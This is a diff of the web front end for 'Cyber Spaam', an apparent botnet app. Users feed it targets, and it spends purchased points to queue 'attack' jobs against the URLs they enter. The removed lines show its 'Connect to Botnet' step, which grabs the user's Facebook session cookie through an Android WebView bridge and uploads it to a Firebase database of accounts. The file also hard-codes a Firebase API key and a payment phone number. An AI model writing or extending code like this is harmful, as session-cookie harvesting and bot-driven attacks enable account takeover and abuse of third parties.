@@ -7,243 +7,43 @@
   <title>Cyber Spaam</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&display=swap');
-
-    :root {
-      --bg-color: #0b0f19;
-      --card-bg: #151f32;
-      --primary: #00ff41;
-      --primary-glow: rgba(0, 255, 65, 0.4);
-      --fb-blue: #1877f2;
-      --danger: #ff3333;
-      --share-color: #8b5cf6;
-      --whatsapp-color: #25D366;
-      --text-main: #e2e8f0;
-      --text-muted: #94a3b8;
-      --nav-bg: #0f172a;
-    }
-
+    :root { --bg-color: #0b0f19; --card-bg: #151f32; --primary: #00ff41; --primary-glow: rgba(0, 255, 65, 0.4); --danger: #ff3333; --whatsapp-color: #25D366; --text-main: #e2e8f0; --text-muted: #94a3b8; --nav-bg: #0f172a; }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Rajdhani', sans-serif; user-select: none; }
-    
-    body { 
-      background-color: var(--bg-color); 
-      color: var(--text-main); 
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .top-bar {
-      background: var(--nav-bg);
-      padding: 15px 20px;
-      text-align: center;
-      border-bottom: 1px solid #1e293b;
-      position: sticky;
-      top: 0;
-      z-index: 100;
-    }
-
-    .top-bar h1 {
-      font-size: 22px;
-      color: var(--primary);
-      text-shadow: 0 0 10px var(--primary-glow);
-      letter-spacing: 2px;
-      cursor: pointer;
-    }
-
-    .content-area {
-      flex: 1;
-      padding: 20px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      overflow-y: auto;
-      padding-bottom: 90px;
-    }
-
-    .card {
-      width: 100%;
-      max-width: 400px;
-      background: var(--card-bg);
-      border-radius: 16px;
-      padding: 25px;
-      border: 1px solid #1e293b;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-      margin-bottom: 20px;
-    }
-
-    .login-panel {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-
-    .login-panel .card {
-      padding: 40px 25px;
-      text-align: center;
-    }
-
-    .subtitle {
-      text-align: center;
-      color: var(--text-muted);
-      font-size: 14px;
-      margin-bottom: 30px;
-      text-transform: uppercase;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 12px;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
-
+    body { background-color: var(--bg-color); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; }
+    .top-bar { background: var(--nav-bg); padding: 15px 20px; text-align: center; border-bottom: 1px solid #1e293b; position: sticky; top: 0; z-index: 100; }
+    .top-bar h1 { font-size: 22px; color: var(--primary); text-shadow: 0 0 10px var(--primary-glow); letter-spacing: 2px; cursor: pointer; }
+    .content-area { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; overflow-y: auto; padding-bottom: 90px; }
+    .card { width: 100%; max-width: 400px; background: var(--card-bg); border-radius: 16px; padding: 25px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); margin-bottom: 20px; }
+    .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s ease; display: flex; align-items: center; justify-content: center; gap: 10px; text-transform: uppercase; letter-spacing: 1px; }
     .btn:active { transform: scale(0.97); }
     .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-
-    .btn-fb { background: var(--fb-blue); color: #fff; box-shadow: 0 4px 15px rgba(24, 119, 242, 0.3); margin-bottom: 15px; }
-    .btn-success { background: var(--primary); color: #000; box-shadow: 0 4px 15px var(--primary-glow); }
     .btn-danger { background: var(--danger); color: #fff; box-shadow: 0 4px 15px rgba(255, 51, 51, 0.3); }
-
-    .status-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: rgba(0, 255, 65, 0.1);
-      color: var(--primary);
-      padding: 6px 12px;
-      border-radius: 20px;
-      font-size: 12px;
-      font-weight: 600;
-      margin: 0 auto 20px auto;
-      border: 1px solid rgba(0, 255, 65, 0.2);
-      width: fit-content;
-    }
-
-    .status-dot {
-      width: 8px;
-      height: 8px;
-      background: var(--primary);
-      border-radius: 50%;
-      box-shadow: 0 0 10px var(--primary);
-      animation: pulse 1.5s infinite;
-    }
-
+    .status-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(0, 255, 65, 0.1); color: var(--primary); padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; margin: 0 auto 20px auto; border: 1px solid rgba(0, 255, 65, 0.2); width: fit-content; }
+    .status-dot { width: 8px; height: 8px; background: var(--primary); border-radius: 50%; box-shadow: 0 0 10px var(--primary); animation: pulse 1.5s infinite; }
     @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
-
-    .points-display {
-      background: #0f172a;
-      border: 1px solid #1e293b;
-      border-radius: 12px;
-      padding: 20px;
-      text-align: center;
-      margin-bottom: 24px;
-    }
-
+    .points-display { background: #0f172a; border: 1px solid #1e293b; border-radius: 12px; padding: 20px; text-align: center; margin-bottom: 24px; }
     .points-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
     .points-value { font-size: 42px; font-weight: 700; color: #facc15; text-shadow: 0 0 15px rgba(250, 204, 21, 0.3); }
-
     .input-group { margin-bottom: 24px; text-align: left; }
     .input-label { font-size: 12px; color: var(--text-muted); margin-bottom: 8px; display: block; text-transform: uppercase; }
-    
-    input {
-      width: 100%;
-      background: #0b0f19;
-      border: 1px solid #334155;
-      color: var(--text-main);
-      padding: 16px;
-      border-radius: 12px;
-      font-size: 15px;
-      outline: none;
-      transition: all 0.3s ease;
-    }
+    input { width: 100%; background: #0b0f19; border: 1px solid #334155; color: var(--text-main); padding: 16px; border-radius: 12px; font-size: 15px; outline: none; transition: all 0.3s ease; }
     input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px rgba(0, 255, 65, 0.1); }
-
     .message { margin-top: 15px; font-size: 14px; text-align: center; font-weight: 600; min-height: 20px; }
     .msg-error { color: var(--danger); }
     .msg-success { color: var(--primary); }
     .msg-warning { color: #facc15; }
-    
     .hidden { display: none !important; }
-
     .spinner { width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
     @keyframes spin { to { transform: rotate(360deg); } }
-
-    .bottom-nav {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      height: 70px;
-      background: var(--nav-bg);
-      border-top: 1px solid #1e293b;
-      display: flex;
-      justify-content: space-around;
-      align-items: center;
-      z-index: 1000;
-    }
-
-    .nav-item {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      color: var(--text-muted);
-      text-decoration: none;
-      font-size: 11px;
-      font-weight: 600;
-      cursor: pointer;
-      width: 20%; /* ৫টি বাটনের জন্য ২০% করা হলো */
-      height: 100%;
-      transition: all 0.2s;
-    }
-
+    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; height: 70px; background: var(--nav-bg); border-top: 1px solid #1e293b; display: flex; justify-content: space-around; align-items: center; z-index: 1000; }
+    .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; color: var(--text-muted); text-decoration: none; font-size: 11px; font-weight: 600; cursor: pointer; width: 20%; height: 100%; transition: all 0.2s; }
     .nav-item:hover, .nav-item.active { color: var(--primary); }
-
-    .nav-icon {
-      width: 24px;
-      height: 24px;
-      margin-bottom: 4px;
-      fill: currentColor;
-    }
+    .nav-icon { width: 24px; height: 24px; margin-bottom: 4px; fill: currentColor; }
   </style>
 </head>
 <body>
 
-  <!-- 🔴 লগইন প্যানেল -->
-  <div id="loginPanel" class="login-panel hidden">
-    <div class="card">
-      <h1 id="appLogo">CYBER SPAAM</h1>
-      <p class="subtitle">Initialize Connection</p>
-      
-      <button class="btn btn-fb" onclick="openFacebookLogin()" id="btnFbLogin">
-        1. Login to Facebook
-      </button>
-      
-      <button class="btn btn-success" onclick="grabCookieAndSave()" id="btnConnect">
-        <span class="spinner" id="connectSpinner"></span>
-        <span id="connectText">2. Connect to Botnet</span>
-      </button>
-      
-      <div id="loginStatus" class="message msg-error"></div>
-    </div>
-  </div>
-
-  <!-- 🟢 মেইন ড্যাশবোর্ড -->
   <div id="attackPanel" class="hidden" style="display:flex; flex-direction:column; min-height:100vh;">
-    
     <div class="top-bar">
       <h1 id="dashLogo">DASHBOARD</h1>
     </div>
@@ -275,33 +75,23 @@
       </div>
     </div>
 
-    <!-- ═══ বটম নেভিগেশন বার (৫টি বাটন) ═══ -->
     <div class="bottom-nav">
-      <!-- হোম -->
       <div class="nav-item active" onclick="window.scrollTo(0,0)">
         <svg class="nav-icon" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
         Home
       </div>
-      
-      <!-- রেফার -->
-      <div class="nav-item" onclick="goToShare()">
+      <div class="nav-item" onclick="window.location.href='share.html'">
         <svg class="nav-icon" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
         Refer
       </div>
-
-      <!-- বাই (হোয়াটসঅ্যাপ) -->
       <div class="nav-item" onclick="buyPoints()" style="color: var(--whatsapp-color);">
         <svg class="nav-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.64 14.71c-.15.06-.33.09-.52.09-.16 0-.34-.03-.54-.08-.19-.06-.35-.12-.48-.19-.68-.35-1.4-.75-2.15-1.38-.64-.54-1.14-1.11-1.49-1.74-.07-.13-.13-.29-.19-.48-.05-.2-.08-.38-.08-.54 0-.19.03-.37.09-.52.07-.15.18-.33.35-.53l.51-.61c.16-.19.24-.4.24-.62 0-.16-.04-.32-.12-.49-.08-.17-.2-.4-.36-.67-.16-.27-.27-.45-.33-.55-.07-.12-.16-.19-.27-.23-.11-.04-.24-.05-.4-.05-.32 0-.6.12-.84.35-.24.23-.45.53-.64.91-.19.38-.29.79-.29 1.24 0 .55.14 1.11.41 1.68.28.57.63 1.09 1.06 1.57.43.47.9.86 1.41 1.16.51.3 1.01.45 1.5.45.45 0 .87-.1 1.25-.3.38-.2.69-.45.91-.76.23-.31.35-.62.35-.91 0-.15-.02-.27-.05-.37-.03-.1-.1-.17-.21-.22zm-2.82-6.35c-.15 0-.31.02-.46.05-.15.04-.28.09-.38.16-.1.07-.18.15-.22.25-.04.1-.07.21-.07.32 0 .11.02.21.06.32.04.11.11.21.2.31l.46.46c.17.17.34.31.51.4.16.09.32.13.46.13.16 0 .31-.04.44-.11.13-.07.24-.17.32-.29l.38-.5c.08-.11.14-.22.18-.32.04-.11.06-.22.06-.32 0-.11-.02-.21-.06-.32-.04-.11-.11-.2-.2-.3-.17-.17-.37-.3-.59-.39-.23-.09-.45-.14-.67-.14z"/></svg>
         Buy
       </div>
-
-      <!-- হিস্ট্রি বাটন -->
       <div class="nav-item" onclick="window.location.href='history.html'">
         <svg class="nav-icon" viewBox="0 0 24 24"><path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"/></svg>
         History
       </div>
-
-      <!-- সেটিংস/লগআউট -->
       <div class="nav-item" onclick="logout()">
         <svg class="nav-icon" viewBox="0 0 24 24"><path d="M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.06-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.73,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.06,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.44-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.49-0.12-0.61L19.14,12.94z M12,15.6c-1.98,0-3.6-1.62-3.6-3.6 s1.62-3.6,3.6-3.6s3.6,1.62,3.6,3.6S13.98,15.6,12,15.6z"/></svg>
         Settings
@@ -311,7 +101,7 @@
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getDatabase, ref, push, set, get, child, update, increment } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+    import { getDatabase, ref, push, set, get, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyC22mPef-Lsi4qqTMZwmQ2WlcUtSTCiIP0",
@@ -326,149 +116,38 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    let currentUserCookie = "";
-    let currentUserPoints = 0;
     let currentUserKey = "";
-    let referrerKey = ""; 
+    let currentUserPoints = 0;
 
-    // ═══ লোকাল স্টোরেজ ক্যাশ ফাংশন ═══
-    function getCachedPoints() {
-      return parseInt(localStorage.getItem('cached_points')) || 0;
-    }
-
-    function updateCachedPoints(newPoints) {
-      localStorage.setItem('cached_points', newPoints);
-      document.getElementById('userPoints').innerText = newPoints;
-      currentUserPoints = newPoints;
-    }
-
-    // ═══ অ্যাপ লোড হওয়া ═══
     window.onload = async function() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const refParam = urlParams.get('ref');
-      if (refParam) {
-        localStorage.setItem('cyber_referrer', refParam);
-        referrerKey = refParam;
-      } else {
-        referrerKey = localStorage.getItem('cyber_referrer') || "";
-      }
-
       const savedCookie = localStorage.getItem('cyber_cookie');
-      const savedKey = localStorage.getItem('cyber_key');
-      const cachedPoints = getCachedPoints();
+      currentUserKey = localStorage.getItem('cyber_key');
+      currentUserPoints = parseInt(localStorage.getItem('cached_points')) || 0;
 
-      if (savedCookie && savedKey) {
-        currentUserCookie = savedCookie;
-        currentUserKey = savedKey;
-        
-        document.getElementById('userPoints').innerText = cachedPoints;
-        currentUserPoints = cachedPoints;
-        
-        document.getElementById('loginPanel').classList.add('hidden');
-        document.getElementById('attackPanel').classList.remove('hidden');
-
-        try {
-          const userRef = ref(db, `users/${currentUserKey}`);
-          const snapshot = await get(userRef);
-          if (snapshot.exists()) {
-            let firebasePoints = snapshot.val().points || 0;
-            if (firebasePoints !== cachedPoints) {
-              updateCachedPoints(firebasePoints);
-            }
-          }
-        } catch (e) { console.log("Auth error:", e); }
-        return;
-      }
-      
-      document.getElementById('attackPanel').classList.add('hidden');
-      document.getElementById('loginPanel').classList.remove('hidden');
-    }
-
-    window.openFacebookLogin = function() {
-      window.location.replace("https://m.facebook.com/login");
-    }
-
-    // ═══ কানেক্ট এবং পয়েন্ট সেভ ═══
-    window.grabCookieAndSave = async function() {
-      const status = document.getElementById('loginStatus');
-      const btn = document.getElementById('btnConnect');
-      const spinner = document.getElementById('connectSpinner');
-      const btnText = document.getElementById('connectText');
-
-      let cookie = "";
-      let deviceName = "Unknown Device";
-      
-      if (window.AndroidCookieManager) {
-        cookie = window.AndroidCookieManager.getFbCookie();
-        deviceName = window.AndroidCookieManager.getDeviceName();
-      } else {
-        status.className = "message msg-error";
-        status.innerText = "❌ WebView Error. Are you using the APK?";
+      // ═══ যদি লগইন না থাকে, তবে সরাসরি login.html এ পাঠিয়ে দাও ═══
+      if (!savedCookie || !currentUserKey) {
+        window.location.replace("login.html");
         return;
       }
 
-      if (!cookie || !cookie.includes('c_user')) {
-        status.className = "message msg-error";
-        status.innerText = "❌ Login failed or no cookie found.";
-        return;
-      }
+      document.getElementById('userPoints').innerText = currentUserPoints;
+      document.getElementById('attackPanel').classList.remove('hidden');
 
-      status.innerText = "";
-      btn.disabled = true;
-      spinner.style.display = "block";
-      btnText.innerText = "Connecting...";
-      
+      // ব্যাকগ্রাউন্ডে ফায়ারবেস থেকে লেটেস্ট পয়েন্ট চেক
       try {
-        const dbRef = ref(db);
-        currentUserKey = btoa(cookie.substring(0, 15)); 
-        const snapshot = await get(child(dbRef, `users/${currentUserKey}`));
-        let points = 0;
-        let isNewUser = false;
-
+        const userRef = ref(db, `users/${currentUserKey}`);
+        const snapshot = await get(userRef);
         if (snapshot.exists()) {
-          points = snapshot.val().points || 0;
-          await update(ref(db, `users/${currentUserKey}`), { cookie: cookie, deviceName: deviceName });
-        } else {
-          await set(ref(db, `users/${currentUserKey}`), { cookie: cookie, points: 0, deviceName: deviceName });
-          isNewUser = true;
+          let firebasePoints = snapshot.val().points || 0;
+          if (firebasePoints !== currentUserPoints) {
+            currentUserPoints = firebasePoints;
+            localStorage.setItem('cached_points', currentUserPoints);
+            document.getElementById('userPoints').innerText = currentUserPoints;
+          }
         }
-if (isNewUser && referrerKey && referrerKey !== currentUserKey) {
-  try {
-    // নতুন ইউজারকে ১ পয়েন্ট
-    await update(ref(db, `users/${currentUserKey}`), { points: increment(1) });
-    
-    // ═══ রেফারারকে ৫ পয়েন্ট ═══
-    await update(ref(db, `users/${referrerKey}`), { points: increment(5), referrals: increment(1) });
-    
-    points += 1; 
-    localStorage.removeItem('cyber_referrer');
-  } catch (refErr) { console.log("Referral error:", refErr); }
+      } catch (e) { console.log(e); }
     }
 
-        const accRef = ref(db, 'accounts');
-        await set(push(accRef), { cookie: cookie });
-
-        currentUserCookie = cookie;
-        currentUserPoints = points;
-        localStorage.setItem('cyber_cookie', currentUserCookie);
-        localStorage.setItem('cyber_key', currentUserKey);
-        
-        updateCachedPoints(points);
-
-        document.getElementById('loginPanel').classList.add('hidden');
-        document.getElementById('attackPanel').classList.remove('hidden');
-        
-      } catch (e) { 
-        status.className = "message msg-error";
-        status.innerText = "❌ Database Error: " + e.message; 
-      } finally {
-        btn.disabled = false;
-        spinner.style.display = "none";
-        btnText.innerText = "2. Connect to Botnet";
-      }
-    }
-
-    // ═══ অ্যাটাক এবং লোকাল পয়েন্ট ও হিস্ট্রি সেভ ═══
     window.launchAttack = async function() {
       const url = document.getElementById('targetUrl').value.trim();
       const status = document.getElementById('status');
@@ -494,22 +173,15 @@ if (isNewUser && referrerKey && referrerKey !== currentUserKey) {
 
       try {
         currentUserPoints--;
-        updateCachedPoints(currentUserPoints);
-        
+        localStorage.setItem('cached_points', currentUserPoints);
+        document.getElementById('userPoints').innerText = currentUserPoints;
         await update(ref(db, `users/${currentUserKey}`), { points: currentUserPoints });
         
-        // জব পুশ করা
         const newJobRef = push(ref(db, 'jobs'));
         await set(newJobRef, { targetUrl: url, status: "pending", createdAt: Date.now(), userKey: currentUserKey });
 
-        // ═══ লোকাল স্টোরেজে হিস্ট্রি সেভ করা ═══
         let localHistory = JSON.parse(localStorage.getItem('cyber_history')) || [];
-        localHistory.unshift({
-          id: newJobRef.key, 
-          url: url,
-          date: new Date().toLocaleString(),
-          status: "pending"
-        });
+        localHistory.unshift({ id: newJobRef.key, url: url, date: new Date().toLocaleString(), status: "pending" });
         localStorage.setItem('cyber_history', JSON.stringify(localHistory));
 
         status.className = "message msg-success";
@@ -528,26 +200,22 @@ if (isNewUser && referrerKey && referrerKey !== currentUserKey) {
 
     window.buyPoints = function() {
       const phoneNumber = "917865875762"; 
-      const message = "Hello Admin, I want to buy Points for Cyber Spaam. My Account ID is: " + currentUserKey;
+      const message = "Hello Arif, I want to buy Points for Cyber Spaam. My Account ID is: " + currentUserKey;
       const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
       window.open(whatsappUrl, "_system");
     }
 
-    window.goToShare = function() {
-      window.location.href = "share.html";
-    }
-
     window.logout = function() {
-      const confirmSwitch = confirm("Switch Account?\n\nYour current account is SAVED in the Botnet database.");
-      if (confirmSwitch) {
+      if (confirm("Switch Account?\n\nYour current account is SAVED in the database.")) {
         localStorage.removeItem('cyber_cookie');
         localStorage.removeItem('cyber_key');
         localStorage.removeItem('cached_points');
-        localStorage.removeItem('cyber_history'); // হিস্ট্রিও ক্লিয়ার হবে
-        window.location.reload(); 
+        localStorage.removeItem('cyber_history');
+        window.location.replace("login.html"); 
       }
     }
 
+    // ৫ বার ট্যাপে অ্যাডমিন প্যানেল
     let tapCount = 0;
     let tapTimer;
     document.getElementById('dashLogo').addEventListener('click', () => {
@@ -561,4 +229,4 @@ if (isNewUser && referrerKey && referrerKey !== currentUserKey) {
     });
   </script>
 </body>
-</html>
+  </html>
